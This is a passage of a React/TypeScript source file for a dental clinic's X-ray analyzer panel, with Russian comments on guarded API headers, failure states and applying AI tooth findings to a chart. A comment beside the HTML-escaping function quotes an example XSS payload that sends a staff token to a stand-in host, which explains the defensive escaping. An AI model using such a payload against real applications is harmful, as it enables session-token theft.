import {
	AlertTriangle,
	Bone,
	Bot,
	CheckCircle2,
	ChevronDown,
	Compass,
	FileText,
	History,
	Loader2,
	MapPin,
	Pin,
	Printer,
	ScanLine,
	Sparkles,
	Trash2,
	UploadCloud,
	Volume2,
	VolumeX,
	Wrench,
	X,
	ZoomIn,
} from "lucide-react";
import type React from "react";
import { useCallback, useEffect, useRef, useState } from "react";
// Русское склонение счётного слова: «1 зуб», «2 зуба», «5 зубов».
import { countLabel } from "../../AppHelpers";
/*
 * Секрет администратора берётся ТОЛЬКО отсюда — из контекста приложения.
 *
 * ЛОВУШКА, В КОТОРУЮ ЛЕГКО ПОПАСТЬ ИМЕННО В ЭТОМ ФАЙЛЕ: строкой выше стоит
 * импорт из AppHelpers.tsx, а там (около строки 6142) есть ЕЩЁ ОДИН экспорт
 * `auth` с теми же именами функций — и он сеансовый секрет НЕ подставляет.
 * С ним код компилируется, гейт check:guarded-headers замолкает, а клиника
 * по-прежнему получает 403: то есть поломка становится невидимой вместо того,
 * чтобы быть исправленной. Секрет из сеанса подставляют только функции из
 * useAppLogicContext() (hooks/domains/useAuthLogic.ts:135 —
 * `adminSecretOverride ?? clinicalAdminSecretSession`).
 */
import { useAppLogicContext } from "../../contexts/AppLogicContext";
import {
	actionFailureToast,
	type PanelSubject,
	panelStateText,
	resolvePanelPhase,
} from "../../lib/panelStateText";
import { usePatientStore } from "../../store/patientStore";
import { logger } from "../../utils/logger";
import { showToast } from "../GlobalToast";
// Состояния ЖИВОЙ зубной формулы и их русские названия. Берутся из того же
// файла, что рисует формулу врачу (components/odontogram/ToothChart.tsx), а
// перечисление там обязано совпадать с toothStateValues на сервере: свой
// список здесь означал бы третий словарь состояний зуба в одном приложении.
import { TOOTH_STATE_LABELS, type ToothState } from "../odontogram/ToothChart";
import { PanelLoadFailure } from "../PanelLoadFailure";
import { VisiographStudioCanvas } from "../visiograph/VisiographStudioCanvas";
import { ShadowAnalystImageSlider } from "./ShadowAnalystImageSlider";
import { planVisiographFindings } from "./visiographFindings";

// ─── Типы ────────────────────────────────────────────────────────────────────

interface XrayScan {
	id: string;
	patientId: string;
	status: "pending" | "analyzing" | "done" | "error";
	kind: string;
	toothCode?: string | null;
	originalFilename?: string | null;
	aiReport?: string | null;
	aiSummary?: string | null;
	aiToothStates?: Record<string, string> | null;
	aiError?: string | null;
	hasImage: boolean;
	imageDataUri?: string | null;
	capturedAt: string;
	createdAt: string;
}

interface AiToothState {
	code: string;
	state: string;
}

// Маппинг статусов ИИ на состояния живой формулы, разбор ответа модели и
// причины, по которым часть находок в карту не пишется, живут в
// ./visiographFindings — это решение о содержимом карты пациента, и оно закрыто
// прогоном src/tests/visiographFindings.test.ts. Внутри компонента его нельзя
// было проверить ничем, кроме платного вызова внешней модели.

// ─── Markdown-рендерер (лёгкий, без зависимостей) ────────────────────────────

/**
 * Экранирование HTML перед подстановкой в разметку.
 *
 * ЗАЧЕМ: renderMarkdown ниже отдаётся в dangerouslySetInnerHTML, а на вход
 * получает отчёт AI-модели (поле aiReport, приходит с сервера). Без
 * экранирования любой тег из ответа модели исполнялся в сессии врача —
 * например `<img src=x onerror="fetch('//evil/?t='+localStorage.dente_staff_token)">`
 * увёл бы токен сотрудника. Экранируем ДО markdown-замен, чтобы теги,
 * которые генерируем мы сами, остались рабочими.
 */
function escapeHtml(value: string): string {
	return String(value)
		.replace(/&/g, "&amp;")
		.replace(/</g, "&lt;")
		.replace(/>/g, "&gt;")
		.replace(/"/g, "&quot;")
		.replace(/'/g, "&#39;");
}

function renderMarkdown(text: string): string {
	return escapeHtml(text)
		.replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
		.replace(/\*(.+?)\*/g, "<em>$1</em>")
		.replace(/^#{1,3}\s+(.+)$/gm, '<h4 style="margin:12px 0 4px">$1</h4>')
		.replace(/^[-*]\s+(.+)$/gm, '<li style="margin:2px 0">$1</li>')
		.replace(
			/(<li.*<\/li>)/s,
			'<ul style="margin:8px 0;padding-left:20px">$1</ul>',
		)
		.replace(/\n\n+/g, "<br/><br/>")
		.replace(/\n/g, "<br/>");
}

// ─── Заголовки отчёта (кликабельные секции) ───────────────────────────────────

const REPORT_SECTIONS: readonly {
	key: string;
	label: string;
	icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
}[] = [
	{ key: "топограф", label: "Топография", icon: MapPin },
	{ key: "существующ", label: "Лечение", icon: Wrench },
	{ key: "патолог", label: "Патологии", icon: AlertTriangle },
	{ key: "анатомическ", label: "Анатомия", icon: Bone },
	{ key: "заключени", label: "Заключение", icon: FileText },
];

function parseReportSections(
	report: string,
): Array<{
	title: string;
	content: string;
	icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
}> {
	if (!report) return [];
	const sections: Array<{
		title: string;
		content: string;
		icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
	}> = [];
	const lines = report.split("\n");
	let currentSection: {
		title: string;
		content: string[];
		icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
	} | null = null;

	for (const line of lines) {
		const isBoldHeading = /^\*\*(.+?):\*\*/.exec(line);
		if (isBoldHeading) {
			if (currentSection) {
				sections.push({
					title: currentSection.title,
					content: currentSection.content.join("\n").trim(),
					icon: currentSection.icon,
				});
			}
			const headingText = (isBoldHeading[1] || "").toLowerCase();
			const found = REPORT_SECTIONS.find((s) => headingText.includes(s.key));
			currentSection = {
				title: isBoldHeading[1] || "",
				icon: found?.icon || Pin,
				content: [line.replace(/^\*\*(.+?):\*\*/, "").trim()],
			};
		} else if (currentSection) {
			currentSection.content.push(line);
		}
	}
	if (currentSection) {
		sections.push({
			title: currentSection.title,
			content: currentSection.content.join("\n").trim(),
			icon: currentSection.icon,
		});
	}

	// Fallback if markdown has no **...: headers — just show raw
	if (!sections.length) {
		sections.push({ title: "Отчёт", icon: FileText, content: report });
	}

	return sections;
}

// ─── Тексты состояний архива снимков ─────────────────────────────────────────

/**
 * Как называется архив для человека — в трёх состояниях сразу.
 * Формулировки берутся из общего модуля lib/panelStateText, а не пишутся здесь
 * заново: на других панелях уже стояли «Ошибка 500» и «данных нет» вместо
 * отказа, и второй язык ошибок на том же экране — это та же поломка.
 */
const SCAN_ARCHIVE_SUBJECT: PanelSubject = {
	// Целая согласованная строка, а не одно название: слова «не загружены»
	// больше не дописывает общий модуль, иначе название в единственном числе
	// («Архив») дало бы «Архив не загружены». Здесь не сказано «архив не
	// прочитан» — эти слова уже стоят в failureConsequence ниже, и повторять их
	// дважды подряд одному человеку незачем.
	notLoadedTitle: "Снимки пациента не загружены",
	accusative: "архив снимков пациента",
	emptyTitle: "Снимков у этого пациента пока нет.",
	emptyHint:
		"Перетащите первый прицельный снимок в поле выше — он попадёт в карту вместе с разбором ИИ.",
	failureConsequence:
		"Не считайте, что снимков нет: архив не прочитан. Прошлые снимки могли быть загружены на другом рабочем месте.",
};

// ─── Основной компонент ───────────────────────────────────────────────────────

export function VisiographAnalyzer() {
	const fileInputRef = useRef<HTMLInputElement>(null);
	const dropRef = useRef<HTMLDivElement>(null);
	const synthRef = useRef<SpeechSynthesis | null>(null);
	// Признак «анализ идёт» именно в ref: значение из useState попадает в замыкание
	// useCallback и устаревает, поэтому два быстрых перетаскивания подряд оба
	// прошли бы проверку и запустили два платных вызова ИИ.
	const analysisInFlightRef = useRef(false);

	const { selectedPatientId } = usePatientStore();

	/*
	 * ЗАГОЛОВКИ ОХРАНЫ. ЭТА ПАНЕЛЬ БЫЛА МЁРТВА У ЗАКАЗЧИКА ЦЕЛИКОМ, и увидеть это
	 * на машине разработчика нельзя.
	 *
	 * Каждый адрес, который зовёт панель, закрыт охраной `apps/api/src/accessGuard.ts`:
	 *   POST /api/imaging/visiograph-ai   — requireClinicalReadAccess (imaging.ts:6225)
	 *   POST /api/xray/scans              — requireClinicalMutationAccess (xray.ts:100)
	 *   GET  /api/xray/scans              — requireClinicalReadAccess (xray.ts:207)
	 *   GET  /api/xray/scans/:id          — requireClinicalReadAccess (xray.ts:228)
	 *   DELETE /api/xray/scans/:id        — requireClinicalMutationAccess (xray.ts:238)
	 * Без заголовка `x-dente-admin-secret` охрана отвечает 403 даже при действительных
	 * токенах кабинета и сотрудника. Панель звала все пять голым fetch, поэтому у
	 * заказчика разбор снимка не запускался вовсе — тело отказа охраны содержит поле
	 * `error`, и врач получал плашку «Ошибка анализа: ClinicalReadSecretRequired»
	 * (accessGuard.ts:79; человеческий текст лежит рядом, в поле `message`, но здесь
	 * его никто не читает — это отдельный мелкий долг). Снимок не сохранялся в карту, а
	 * архив снимков пациента помечался как непрочитанный. Локально всё зелёное: в корневом `.env` секрет
	 * закомментирован, зато включены лазейки
	 * DENTE_CLINICAL_ALLOW_UNGUARDED_READS/MUTATIONS, а живут они только пока
	 * NODE_ENV !== "production". Ни типы, ни тесты, ни глаза на этой машине такого не
	 * показывают — ловит `npm run check:guarded-headers`.
	 *
	 * ПОЧЕМУ ЧЕРЕЗ ref. `processFile` мемоизирован (useCallback по
	 * [selectedPatientId]), и взятый в его замыкание `auth` застыл бы
	 * на том отрисовывании, когда секрета в сеансе ещё не было — он появляется после
	 * разблокировки раздела, и 403 держался бы до перезагрузки страницы. Дописать
	 * `auth` в зависимости тоже нельзя: useAuthLogic возвращает НОВЫЙ объект на каждом
	 * отрисовывании (useAppLogic.tsx:2395, без useMemo), а такие зависимости в других
	 * панелях этого проекта уже дают перезапуск запроса на каждом отрисовывании. Ref
	 * остаётся одним объектом, значение в нём всегда свежее, поэтому функции ниже
	 * читают секрет В МОМЕНТ ЗАПРОСА — даже вызванные из устаревшего замыкания.
	 */
	const appLogic = useAppLogicContext();
	const authRef = useRef(appLogic?.auth);
	authRef.current = appLogic?.auth;

	/*
	 * ДВЕ ОБЁРТКИ, А НЕ ПОВТОР ПРОВЕРКИ У КАЖДОГО ИЗ ПЯТИ ВЫЗОВОВ. Они делают ровно
	 * одно: читают свежий `auth` из ref и передают дело функциям контекста.
	 *
	 * ПОЧЕМУ ИМЕНА ТЕ ЖЕ, что у функций контекста. Гейт check:guarded-headers ищет у
	 * вызова именно эти имена (scripts/check-guarded-route-headers.mjs:56), и местное
	 * имя-синоним сделало бы все пять вызовов невидимыми для проверки: файл выглядел
	 * бы исправленным, а следующий добавленный сюда голый fetch никто бы не поймал.
	 * Столкновения имён нет — этих имён в файле не импортируют, а обёртка вызывает
	 * ровно ту функцию, чьё имя носит.
	 *
	 * Проверка на `auth` — не перестраховка, но обоснование ей нужно другое, чем
	 * стояло здесь. БЫЛО: «useAppLogicContext() вне провайдера возвращает пустой
	 * объект (contexts/AppLogicContext.tsx:21)». Больше НЕ возвращает — вне провайдера
	 * хук бросает исключение, пустого объекта он не выдумывает. Проверка остаётся по
	 * другой причине: провайдер может стоять, а раздела `auth` в его значении не быть,
	 * и обращение к
	 * отсутствующей функции уронило бы всю карту пациента вместо показа отказа. В этом
	 * случае `extra` возвращается как есть: у запросов с телом там лежит Content-Type,
	 * и потерять его значило бы сломать разбор тела на сервере ещё и без секрета.
	 */
	const denteClinicalReadHeaders = useCallback(
		(extra?: Record<string, string>): Record<string, string> => {
			const auth = authRef.current;
			return auth && typeof auth.denteClinicalReadHeaders === "function"
				? auth.denteClinicalReadHeaders(extra ?? {})
				: { ...(extra ?? {}) };
		},
		[],
	);

	const denteClinicalMutationHeaders = useCallback(
		(extra?: Record<string, string>): Record<string, string> => {
			const auth = authRef.current;
			return auth && typeof auth.denteClinicalMutationHeaders === "function"
				? auth.denteClinicalMutationHeaders(extra ?? {})
				: { ...(extra ?? {}) };
		},
		[],
	);

	const [isDragOver, setIsDragOver] = useState(false);
	const [isAnalyzing, setIsAnalyzing] = useState(false);
	const [isSaving, setIsSaving] = useState(false);
	const [currentImageUrl, setCurrentImageUrl] = useState<string | null>(null);
	const [currentScan, setCurrentScan] = useState<XrayScan | null>(null);
	const [scanHistory, setScanHistory] = useState<XrayScan[]>([]);
	const [isLoadingHistory, setIsLoadingHistory] = useState(false);
	// Отказ чтения архива храним отдельно от `error` (тот подписан «Ошибка
	// анализа» и относится к разбору снимка). Обёртка-объект, а не просто число:
	// status = null — это «до сервера не дошли вовсе», и его надо отличать от
	// «отказа не было».
	const [historyFailure, setHistoryFailure] = useState<{
		status: number | null;
	} | null>(null);
	/*
	 * Отказ ЗАПИСИ в карту держим отдельно от `error` (тот подписан «Ошибка
	 * анализа» и означает «разбора нет вовсе»). Здесь разбор как раз есть и уже
	 * показан на экране, но в карту он не лёг. Без этого признака отказ записи
	 * был НЕВИДИМ: заключение висело на экране как готовое, а после перезагрузки
	 * страницы исчезало — врач считал, что оно в карте.
	 */
	const [saveFailure, setSaveFailure] = useState<string | null>(null);
	/*
	 * Что РЕАЛЬНО легло в зубную формулу, и о чём помощник сказал непонятно.
	 * Нужны раздельно, потому что заголовок под снимком утверждал «обновлено в
	 * формуле» про ВСЕ присланные позиции, включая непонятые и с мусорным номером
	 * зуба, — то есть про зубы, которых он не трогал.
	 */
	const [appliedToothCodes, setAppliedToothCodes] = useState<string[]>([]);
	const [applyNotice, setApplyNotice] = useState<string | null>(null);
	/*
	 * Отказ записи В ЗУБНУЮ ФОРМУЛУ. Отдельно и от `error` (там «разбора нет
	 * вовсе»), и от `saveFailure` (там «снимок и заключение не легли в карту»):
	 * формула и архив снимков — две разные записи в карте пациента, они уходят
	 * разными запросами и отказать могут по одной, а врач должен знать, ЧТО именно
	 * не сохранилось. Без этого признака отказ записи формулы был бы невидим —
	 * ровно так и жил прежний дефект.
	 */
	const [formulaFailure, setFormulaFailure] = useState<string | null>(null);
	const [selectedFindingCodes, setSelectedFindingCodes] = useState<Set<string>>(new Set());
	const [isApplyingToChart, setIsApplyingToChart] = useState(false);
	/*
	 * Снимок открыт из архива, а не разобран сейчас. Тогда про зубную формулу
	 * ничего не утверждаем: этот разбор применялся когда-то раньше, и сказать
	 * «внесено сейчас» или «не внесено» — соврать в обе стороны.
	 */
	const [isHistoryView, setIsHistoryView] = useState(false);
	const [error, setError] = useState<string | null>(null);
	const [isSpeaking, setIsSpeaking] = useState(false);
	const [voicesReady, setVoicesReady] = useState(false);
	const [activeSection, setActiveSection] = useState<number | null>(null);
	const [historyExpanded, setHistoryExpanded] = useState(false);
	/*
	 * Удаление снимка из архива. deletingScanId — id строки, по которой сейчас
	 * идёт DELETE (кнопка в этой строке крутит индикатор и disabled). deleteFailure
	 * — человеческий отказ рядом со списком архива, отдельно от historyFailure
	 * (чтение) и saveFailure (запись нового разбора): иначе врач не отличит
	 * «архив не прочитан» от «этот снимок не удалось убрать».
	 */
	const [deletingScanId, setDeletingScanId] = useState<string | null>(null);
	const [deleteFailure, setDeleteFailure] = useState<string | null>(null);
	/*
	 * Отказ ОТКРЫТИЯ полного снимка из архива. Отдельно от historyFailure
	 * (список не прочитан) и deleteFailure (не удалось убрать): врач кликнул
	 * строку, метаданные уже на экране, а картинка/полный отчёт не доехали.
	 * Без этого признака отказ выглядел как «снимок без изображения» — врач
	 * думал, что в карте нет файла.
	 */
	const [openFailure, setOpenFailure] = useState<string | null>(null);
	const [isStudioMode, setIsStudioMode] = useState(false);

	// ── Voice init ──────────────────────────────────────────────────────────
	useEffect(() => {
		if (typeof window === "undefined") return;
		const synth = window.speechSynthesis;
		synthRef.current = synth;
		const setReady = () => setVoicesReady(true);
		if (synth.getVoices().length > 0) setReady();
		else synth.addEventListener("voiceschanged", setReady, { once: true });
		// Слушатель с { once: true } не снимается, если событие так и не произошло:
		// при размонтировании он остаётся висеть на глобальном speechSynthesis.
		return () => {
			synth.removeEventListener("voiceschanged", setReady);
			synth.cancel();
		};
	}, []);

	/**
	 * Чтение архива снимков пациента.
	 *
	 * ЧТО БЫЛО СЛОМАНО. Тело состояло из `if (!res.ok) return;` и пустого catch,
	 * и setError здесь не вызывался ни разу. Любой отказ — у смены нет доступа,
	 * сервер клиники не запущен, ответ непонятен — выглядел на экране РОВНО как
	 * «у пациента нет снимков»: счётчик в сводке и секция «История снимков» просто
	 * не появлялись, а сама панель оставалась на вид полностью рабочей. Врач не
	 * мог отличить непрочитанный архив от пустого и делал вывод «снимков не было».
	 *
	 * Второе, тяжелее. Прежний список НЕ гасился. Эффект выше чистит scanHistory
	 * только когда пациент не выбран вовсе, а при прямом переключении A→B
	 * (setSelectedPatientId пишет новый id, не проходя через null) неудачный ответ
	 * по B оставлял на экране снимки A под открытой картой B — чужие снимки в
	 * чужой карте. Поэтому список чистится ДО запроса.
	 *
	 * Третье. Ответ применяется только если пациент с тех пор не сменился: запрос
	 * по A может вернуться позже переключения на B и записать снимки A в карту B.
	 * По той же причине isLoadingHistory гасит только актуальный запрос — иначе
	 * поздний ответ по A убирал бы индикатор загрузки у идущего запроса по B.
	 */
	const loadHistory = useCallback(
		async function loadHistory(patientId: string) {
			setIsLoadingHistory(true);
			setHistoryFailure(null);
			setDeleteFailure(null);
			setOpenFailure(null);
			setScanHistory([]);
			// null = до сервера не дошли; после ответа сюда попадает его код, поэтому
			// «непонятный ответ при 200» и «сервер не ответил» дают разные тексты.
			let status: number | null = null;
			const isStale = () =>
				usePatientStore.getState().selectedPatientId !== patientId;
			try {
				// Content-Type у этого запроса больше нет: тела у GET нет, и объявлять его
				// формат было нечего — а место заголовков нужно тому, без чего охрана
				// отвечает 403.
				const res = await fetch(`/api/xray/scans?patientId=${patientId}`, {
					headers: denteClinicalReadHeaders(),
				});
				status = res.status;
				if (isStale()) return;
				if (!res.ok) {
					setHistoryFailure({ status });
					return;
				}
				const data = (await res.json()) as unknown;
				if (isStale()) return;
				// Сервер обязан отдать массив (GET /api/xray/scans возвращает
				// scans.map(...)). Если пришло что-то другое — это отказ, а не пустой
				// архив: прежний код падал здесь на data.filter и уходил в пустой catch.
				if (!Array.isArray(data)) {
					setHistoryFailure({ status });
					return;
				}
				setScanHistory((data as XrayScan[]).filter((s) => s.status === "done"));
			} catch (err) {
				showToast(
					actionFailureToast(
						"Ошибка выполнения операции",
						(err as { status?: number })?.status ?? null,
					),
					"error",
				);
				// Код ответа человеку не показываем — он уходит в консоль разработчику.
				logger.error("[VisiographAnalyzer] Архив снимков не прочитан:", err);
				if (isStale()) return;
				setHistoryFailure({ status });
			} finally {
				if (!isStale()) setIsLoadingHistory(false);
			}
		},
		[denteClinicalReadHeaders],
	);

	// ── Load scan history when patient changes ──────────────────────────────
	useEffect(() => {
		if (!selectedPatientId) {
			setScanHistory([]);
			setHistoryFailure(null);
			setDeleteFailure(null);
			setOpenFailure(null);
			setDeletingScanId(null);
			// Индикатор гасим и здесь: запрос по прежнему пациенту вернётся уже
			// «просроченным» и свой finally пропустит, иначе счётчик в сводке остался
			// бы с «…» навсегда.
			setIsLoadingHistory(false);
			return;
		}
		loadHistory(selectedPatientId);
	}, [selectedPatientId, loadHistory]);

	/**
	 * Запись одной группы зубов в живую формулу пациента.
	 *
	 * Адрес и формат тела — те же, что у смонтированной формулы
	 * (OdontogramModule.updateToothState): POST
	 * /api/patients/:patientId/tooth-states/batch, тело
	 * `{ toothNumbers, state }`. Второй способ писать состояние зуба заводить
	 * нельзя — сервер в этом же запросе ведёт историю зуба и рассылает живое
	 * обновление UPDATE_ODONTOGRAM, благодаря которому открытая формула
	 * показывает находки сразу, без перезагрузки страницы.
	 *
	 * Пишущие заголовки обязательны: маршрут закрыт
	 * requireResolvedStaffOrAdminOrganizationId, то есть требует И токен кабинета,
	 * И токен сотрудника. Голый fetch получил бы 401, и экран показал бы пустоту
	 * вместо отказа — этот класс дефекта в проекте уже встречался.
	 *
	 * Возвращает null при успехе и человеческий текст отказа иначе.
	 */
	const writeToothStatesToChart = useCallback(
		async (
			patientId: string,
			toothNumbers: number[],
			state: ToothState,
		): Promise<string | null> => {
			const action = `Отметка «${TOOTH_STATE_LABELS[state]}» по снимку на ${countLabel(toothNumbers.length, "зубе", "зубах", "зубах")} ${toothNumbers.join(", ")} не внесена в зубную формулу`;
			try {
				const res = await fetch(
					`/api/patients/${patientId}/tooth-states/batch`,
					{
						method: "POST",
						headers: denteClinicalMutationHeaders({
							"Content-Type": "application/json",
						}),
						body: JSON.stringify({ toothNumbers, state }),
					},
				);
				if (!res.ok) {
					const rawBody = await res.text();
					logger.error(
						`[VisiographAnalyzer] формула не обновлена, ${res.status} ${rawBody.slice(0, 300)}`,
					);
					return `${actionFailureToast(action, res.status)} Поставьте отметку на схеме зубов руками.`;
				}
				return null;
			} catch (err) {
				showToast(
					actionFailureToast(
						"Ошибка выполнения операции",
						(err as { status?: number })?.status ?? null,
					),
					"error",
				);
				logger.error(
					"[VisiographAnalyzer] запрос обновления формулы не выполнен",
					err,
				);
				// До сервера не дошли: кода ответа нет, придумывать его нельзя.
				return `${actionFailureToast(action, null)} Поставьте отметку на схеме зубов руками.`;
			}
		},
		[denteClinicalMutationHeaders],
	);

	// ── File processing: Instant display in < 50ms without lossy blur ───────
	const processFile = useCallback(
		async (file: File) => {
			if (!file.type.startsWith("image/")) {
				setError("Поддерживаются только изображения (JPG, PNG, BMP, TIFF).");
				return;
			}

			setError(null);
			setSaveFailure(null);
			setFormulaFailure(null);
			setOpenFailure(null);
			setAppliedToothCodes([]);
			setSelectedFindingCodes(new Set());
			setApplyNotice(null);
			setIsHistoryView(false);
			setCurrentScan(null);
			setCurrentImageUrl(null);

			try {
				// 1. Чтение оригинального снимка напрямую без мыла и без принудительного даунскейла
				const dataUrl = await new Promise<string>((resolve, reject) => {
					const reader = new FileReader();
					reader.onload = (ev) => resolve(ev.target?.result as string);
					reader.onerror = reject;
					reader.readAsDataURL(file);
				});

				// МГНОВЕННОЕ ОТОБРАЖЕНИЕ СНИМКА В КРИСТАЛЬНОМ КАЧЕСТВЕ (< 50 мс)
				setCurrentImageUrl(dataUrl);

				const localScan: XrayScan = {
					id: crypto.randomUUID?.() ?? `local-${Date.now()}`,
					patientId: selectedPatientId ?? "unknown",
					status: "done",
					kind: "periapical",
					originalFilename: file.name,
					hasImage: true,
					imageDataUri: dataUrl,
					capturedAt: new Date().toISOString(),
					createdAt: new Date().toISOString(),
				};
				setCurrentScan(localScan);

				// 2. Фоновое асинхронное сохранение снимка в карту пациента (не блокирует экран и врача)
				if (selectedPatientId) {
					setIsSaving(true);
					try {
						const saveRes = await fetch("/api/xray/scans", {
							method: "POST",
							headers: denteClinicalMutationHeaders({
								"Content-Type": "application/json",
							}),
							body: JSON.stringify({
								patientId: selectedPatientId,
								imageBase64: dataUrl,
								originalFilename: file.name,
								mimeType: file.type || "image/jpeg",
								kind: "periapical",
								status: "done",
							}),
						});
						if (!saveRes.ok) {
							logger.error(
								`[VisiographAnalyzer] снимок не сохранён, ответ ${saveRes.status}`,
							);
							setSaveFailure(
								saveRes.status === 413
									? "Снимок слишком тяжёлый для сохранения в базу данных."
									: "Не удалось сохранить снимок в карту пациента на сервере.",
							);
						} else {
							const saved: XrayScan = await saveRes.json();
							setCurrentScan((prev) => ({
								...(prev ?? saved),
								id: saved.id,
								imageDataUri: dataUrl,
								hasImage: true,
							}));
							setScanHistory((prev) => [saved, ...prev]);
						}
					} catch (saveErr) {
						logger.error(
							"[VisiographAnalyzer] запись снимка в карту не выполнена",
							saveErr,
						);
						setSaveFailure("Сервер не ответил на сохранение снимка в карту.");
					} finally {
						setIsSaving(false);
					}
				}
			} catch (err: any) {
				logger.error("[VisiographAnalyzer] Error reading file:", err);
				setError(err.message || "Не удалось загрузить снимок.");
			} finally {
				if (fileInputRef.current) fileInputRef.current.value = "";
			}
		},
		[selectedPatientId, denteClinicalMutationHeaders],
	);

	// ── Фоновый опциональный ИИ-анализ снимка по явной команде врача ──────────
	const handleRunAiAnalysis = useCallback(async () => {
		if (!currentImageUrl) {
			showToast("Сначала загрузите снимок визиографа", "warning");
			return;
		}
		if (analysisInFlightRef.current || isAnalyzing) return;
		analysisInFlightRef.current = true;
		setIsAnalyzing(true);
		setError(null);
		setFormulaFailure(null);
		setApplyNotice(null);

		const patientAtStart = selectedPatientId ?? null;

		try {
			const aiRes = await fetch("/api/imaging/visiograph-ai", {
				method: "POST",
				headers: denteClinicalReadHeaders({
					"Content-Type": "application/json",
				}),
				body: JSON.stringify({ imageBase64: currentImageUrl }),
			});

			if (!aiRes.ok) {
				const errData = await aiRes.json().catch(() => ({}));
				throw new Error(
					errData.error || `AI сервис недоступен (HTTP ${aiRes.status})`,
				);
			}

			const aiResult = (await aiRes.json()) as {
				report: string;
				toothStates: Record<string, string>;
				warnings: string[];
			};

			const patientNow = usePatientStore.getState().selectedPatientId ?? null;
			if (patientAtStart !== patientNow) {
				setError(
					"Пациент был изменён во время анализа. Результат не применён — откройте снимок нужного пациента и повторите.",
				);
				return;
			}

			// Обновляем текущий снимок результатами ИИ (без автоматической перезаписи формулы)
			setCurrentScan((prev) => {
				if (!prev) return null;
				return {
					...prev,
					aiReport: aiResult.report,
					aiSummary: extractSummary(aiResult.report),
					aiToothStates: aiResult.toothStates,
				};
			});

			// Если снимок сохранён на сервере, обновляем AI-поля в базе
			if (currentScan?.id && !currentScan.id.startsWith("local-") && selectedPatientId) {
				fetch(`/api/xray/scans/${encodeURIComponent(currentScan.id)}`, {
					method: "PUT",
					headers: denteClinicalMutationHeaders({
						"Content-Type": "application/json",
					}),
					body: JSON.stringify({
						aiReport: aiResult.report,
						aiSummary: extractSummary(aiResult.report),
						aiToothStates: aiResult.toothStates,
					}),
				}).catch((e) => logger.warn("[VisiographAnalyzer] Background scan PUT error:", e));
			}

			// Формируем план находок для рекомендательного списка
			const plan = planVisiographFindings(aiResult.toothStates);
			const allPlanCodes = plan.groups.flatMap((g) => g.teeth.map((t) => t.code));
			setSelectedFindingCodes(new Set(allPlanCodes));

			const notices: string[] = [];
			if (plan.unreadableCodes.length > 0) {
				notices.push(
					`Помощник описал непонятно ${countLabel(plan.unreadableCodes.length, "зуб", "зуба", "зубов")} (${plan.unreadableCodes.join(", ")}). В зубную формулу они НЕ внесены — посмотрите эти места на снимке сами.`,
				);
			}
			if (plan.noFormulaStateCodes.length > 0) {
				notices.push(
					`Для ${countLabel(plan.noFormulaStateCodes.length, "зуба", "зубов", "зубов")} (${plan.noFormulaStateCodes.join(", ")}) в зубной формуле нет подходящего состояния: помощник назвал их «наблюдение», «план» или «ранее вылечен». Отметьте эти зубы на схеме сами — что именно найдено, написано в заключении ниже.`,
				);
			}
			if (notices.length > 0) setApplyNotice(notices.join(" "));

			showToast("ИИ-анализ снимка завершён. Ознакомьтесь с рекомендациями ниже.", "success");
		} catch (err: any) {
			logger.error("[VisiographAnalyzer] AI Error:", err);
			setError(
				err.message ||
					"Не удалось провести ИИ-анализ снимка. Проверьте подключение.",
			);
		} finally {
			analysisInFlightRef.current = false;
			setIsAnalyzing(false);
		}
	}, [
		currentImageUrl,
		isAnalyzing,
		selectedPatientId,
		currentScan?.id,
		denteClinicalReadHeaders,
		denteClinicalMutationHeaders,
	]);

	// ── Внесение находок ИИ в зубную формулу только по явному клику врача ─────
	const handleApplyFindingsToChart = useCallback(async () => {
		if (!currentScan?.aiToothStates) return;
		const patientId = selectedPatientId;
		if (!patientId) {
			setFormulaFailure(
				"Пациент не выбран, поэтому находки НЕ внесены в зубную формулу. Откройте карту пациента.",
			);
			return;
		}

		const plan = planVisiographFindings(currentScan.aiToothStates);
		if (plan.groups.length === 0) {
			showToast("Нет подходящих для зубной формулы находок", "warning");
			return;
		}

		setIsApplyingToChart(true);
		setFormulaFailure(null);
		const appliedCodes: string[] = [];
		const writeFailures: string[] = [];

		for (const group of plan.groups) {
			const teethToApply = group.teeth.filter((t) => selectedFindingCodes.has(t.code));
			if (teethToApply.length === 0) continue;

			const failure = await writeToothStatesToChart(
				patientId,
				teethToApply.map((t) => t.toothNumber),
				group.state,
			);
			if (failure) {
				writeFailures.push(failure);
			} else {
				appliedCodes.push(...teethToApply.map((t) => t.code));
			}
		}

		if (writeFailures.length > 0) {
			setFormulaFailure(writeFailures.join(" "));
		}
		if (appliedCodes.length > 0) {
			setAppliedToothCodes((prev) => Array.from(new Set([...prev, ...appliedCodes])));
			showToast(
				`В зубную формулу внесено: ${countLabel(appliedCodes.length, "зуб", "зуба", "зубов")} (${appliedCodes.join(", ")})`,
				"success",
			);
		}
		setIsApplyingToChart(false);
	}, [
		currentScan?.aiToothStates,
		selectedPatientId,
		selectedFindingCodes,
		writeToothStatesToChart,
	]);

	// ── Drag & Drop ─────────────────────────────────────────────────────────
	const handleDrop = useCallback(
		(e: React.DragEvent) => {
			e.preventDefault();
			setIsDragOver(false);
			// Проверка isAnalyzing есть внутри processFile — второй снимок,
			// бросенный во время анализа, больше не запускает параллельный разбор.
			const file = e.dataTransfer.files?.[0];
			if (file) processFile(file);
		},
		[processFile],
	);

	const handleDragOver = (e: React.DragEvent) => {
		e.preventDefault();
		setIsDragOver(true);
	};
	const handleDragLeave = () => setIsDragOver(false);
	const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const file = e.target.files?.[0];
		if (file) processFile(file);
	};

	// ── Load historical scan ────────────────────────────────────────────────
	const loadHistoryScan = async (scan: XrayScan) => {
		setCurrentScan(scan);
		setCurrentImageUrl(null);
		/*
		 * Признаки прошлого разбора гасим: applyNotice, список внесённых зубов и
		 * отказ записи относились к снимку, который разбирали сейчас. Без сброса
		 * плашка «заключение не сохранено» висела бы над чужим снимком из архива.
		 */
		setIsHistoryView(true);
		setAppliedToothCodes([]);
		setSelectedFindingCodes(new Set());
		setIsApplyingToChart(false);
		setApplyNotice(null);
		setSaveFailure(null);
		setFormulaFailure(null);
		setDeleteFailure(null);
		setOpenFailure(null);
		setError(null);
		// БЫЛО: if (res.ok) без else + catch { silent }.
		// Отказ GET /api/xray/scans/:id (403/404/сеть) оставлял на экране
